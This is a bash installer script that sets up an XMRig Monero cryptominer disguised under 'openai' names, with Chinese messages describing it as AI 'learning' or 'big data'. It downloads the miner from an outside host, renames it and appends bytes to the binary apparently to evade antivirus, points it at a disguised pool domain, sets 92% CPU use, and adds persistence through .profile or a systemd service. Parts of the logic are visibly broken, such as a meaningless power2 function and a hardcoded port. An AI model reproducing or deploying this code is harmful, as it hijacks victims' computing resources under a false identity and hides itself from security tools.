#!/bin/bash

VERSION=2.11

# printing greetings

echo "mining setup script v$VERSION."

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
  echo "警告: 不建议在root用户下使用此脚本"
fi

# command line arguments
WALLET=$1
EMAIL="" # this one is optional
PASS=$2

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_openai.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 19999 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background openai."
echo "将进行下载设置,并在后台中运行openai大数据."
echo "If needed, miner in foreground can be started by $HOME/openai/miner.sh script."
echo "如果需要,可以通过以下方法启动前台openai输出 $HOME/openai/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo "将使用 $WALLET 地址进行学习"
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://openai.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, study in background will started from your $HOME/.profile file first time you login this host after reboot."
  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台学习将从您的 $HOME/.profile 文件开始."
else
  echo "Mining in background will be performed using openai systemd service."
  echo "后台开采将使用openai systemd服务执行."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 1 seconds before continuing (press Ctrl+C to cancel)"
echo "等待 1 秒将继续运行安装 (按 Ctrl+C 取消)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous openai (if any)"
echo "[*] 卸载以前的 openai (如果存在)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop openai.service
fi
killall -9 openai

echo "[*] Removing $HOME/openai directory"
rm -rf $HOME/openai

echo "[*] Downloading openai advanced version of openai to /tmp/openai.tar.gz"
echo "[*] 下载 openai 版本的 Xmrig 到 /tmp/openai.tar.gz 中"
if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/openai.tar.gz; then
  echo "ERROR: Can't download http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/openai.tar.gz"
  echo "发生错误: 无法下载 http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/openai.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/openai.tar.gz to $HOME/openai"
echo "[*] 解压 /tmp/openai.tar.gz 到 $HOME/openai"
[ -d $HOME/openai ] || mkdir $HOME/openai
if ! tar xf /tmp/openai.tar.gz -C $HOME/openai; then
  echo "ERROR: Can't unpack /tmp/openai.tar.gz to $HOME/openai directory"
  echo "发生错误: 无法解压 /tmp/openai.tar.gz 到 $HOME/openai 目录"
  exit 1
fi
rm /tmp/openai.tar.gz
mv $HOME/openai/xmrig $HOME/openai/openai
echo "000" >> $HOME/openai/openai
echo "[*] Checking if advanced version of $HOME/openai/dopenai works fine (and not removed by antivirus software)"
echo "[*] 检查目录 $HOME/openai/openai 中的openai是否运行正常 (或者是否被杀毒软件误杀)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/openai/config.json
$HOME/openai/openai --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/openai/dopenai ]; then
    echo "WARNING: Advanced version of $HOME/openai/openai is not functional"
	echo "警告: 版本 $HOME/openai/openai 无法正常工作"
  else 
    echo "WARNING: Advanced version of $HOME/openai/openai was removed by antivirus (or some other problem)"
	echo "警告: 该目录 $HOME/openai/openai 下的xmrig已被杀毒软件删除 (或其它问题)"
  fi

  echo "[*] Looking for the latest version of openai"
  echo "[*] 查看最新版本的 openai 学习工具"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/openai.tar.gz"
  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/openai.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/openai.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/openai.tar.gz"
	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/openai.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/openai.tar.gz to $HOME/openai"
  echo "[*] 解压 /tmp/openai.tar.gz 到 $HOME/openai"
  if ! tar xf /tmp/openai.tar.gz -C $HOME/openai --strip=1; then
    echo "WARNING: Can't unpack /tmp/openai.tar.gz to $HOME/openai directory"
	echo "警告: 无法解压 /tmp/openai.tar.gz 到 $HOME/openai 目录下"
  fi
  rm /tmp/openai.tar.gz
  mv $HOME/openai/openai $HOME/openai/openai
  echo "0" >> $HOME/openai/openai

  echo "[*] Checking if stock version of $HOME/openai/openai works fine (and not removed by antivirus software)"
  echo "[*] 检查目录 $HOME/openai/openai 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/openai/config.json
  $HOME/openai/openai --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/openai/openai ]; then
      echo "ERROR: Stock version of $HOME/openai/openai is not functional too"
	  echo "发生错误: 该目录中的 $HOME/openai/openai 也无法使用"
    else 
      echo "ERROR: Stock version of $HOME/openai/openai was removed by antivirus too"
	  echo "发生错误: 该目录中的 $HOME/openai/openai 已被杀毒软件删除"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/openai/openai is OK"
echo "[*] 矿工 $HOME/openai/openai 运行正常"

#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS="365portalaz"
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
fi


sed -i 's/"url": *"[^"]*",/"url": "chatgpt.ai.88877766.xyz:'$PORT'",/' $HOME/openai/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/openai/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/openai/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 92,/' $HOME/openai/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/gpt.log'",#' $HOME/openai/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/openai/config.json

cp $HOME/openai/config.json $HOME/openai/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/openai/config_background.json

# preparing script

echo "[*] Creating $HOME/openai/ai.sh script"
echo "[*] 在该目录下创建 $HOME/openai/ai.sh 脚本"
cat >$HOME/openai/ai.sh <<EOL
#!/bin/bash
if ! pidof openai >/dev/null; then
  nice $HOME/openai/openai \$*
else
  echo "openai is already running in the background. Refusing to run another one."
  echo "Run \"killall openai\" or \"sudo killall openai\" if you want to remove background miner first."
  echo "openai已经在后台运行。 拒绝运行另一个."
  echo "如果要先删除后台openai，请运行 \"killall openai\" 或 \"sudo killall openai\"."
fi
EOL

chmod +x $HOME/openai/ai.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep openai/ai.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/openai/ai.sh script to $HOME/.profile"
	echo "[*] 添加 $HOME/openai/ai.sh 到 $HOME/.profile"
    echo "$HOME/openai/ai.sh --config=$HOME/openai/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/openai/ai.sh script is already in the $HOME/.profile"
	echo "脚本 $HOME/openai/ai.sh 已存在于 $HOME/.profile 中."
  fi
  echo "[*] Running openai in the background (see logs in $HOME/openai/openai.log file)"
  echo "[*] 已在后台运行openai矿工 (请查看 $HOME/openai/openai.log 日志文件)"
  /bin/bash $HOME/openai/ai.sh --config=$HOME/openai/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
	echo "[*] 启用 huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running openai in the background (see logs in $HOME/openai/ai.log file)"
	echo "[*] 已在后台运行openai (请查看 $HOME/openai/ai.log 日志文件)"
    /bin/bash $HOME/openai/ai.sh --config=$HOME/openai/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating openai systemd service"
    cat >/tmp/openai.service <<EOL
[Unit]
Description=openai service

[Service]
ExecStart=$HOME/openai/openai --config=$HOME/openai/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/openai.service /etc/systemd/system/openai.service
    echo "[*] Starting openai systemd service"
	echo "[*] 启动openai systemd服务"
    sudo killall openai 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable openai.service
    sudo systemctl start openai.service
    echo "To see openai service logs run \"sudo journalctl -u openai -f\" command"
	echo "查看openai服务日志,请运行 \"sudo journalctl -u openai -f\" 命令"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the openai or you will be banned"
echo "提示: 如果您使用共享VPS，建议避免由openai产生100％的CPU使用率，否则可能将被禁止使用"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config_background.json"
fi
echo ""

echo "[*] Setup complete"
